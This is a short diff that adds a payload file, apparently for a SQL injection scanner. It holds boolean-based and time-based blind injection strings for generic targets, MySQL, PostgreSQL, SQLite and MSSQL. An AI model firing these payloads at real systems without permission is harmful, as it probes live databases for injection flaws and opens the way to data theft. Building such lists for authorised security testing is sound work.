@@ -1,0 +1,9 @@
+# Boolean-Based Payloads
+BOOLEAN:Generic:' AND '1'='1--
+BOOLEAN:Generic:' AND '1'='2--
+
+# Time-Based Payloads
+TIME:MySQL:' AND SLEEP({delay})--
+TIME:PostgreSQL:' AND pg_sleep({delay})--
+TIME:SQLite:' AND 1=randomblob({delay}*10000000)--
+TIME:MSSQL:' WAITFOR DELAY '0:0:{delay}'--
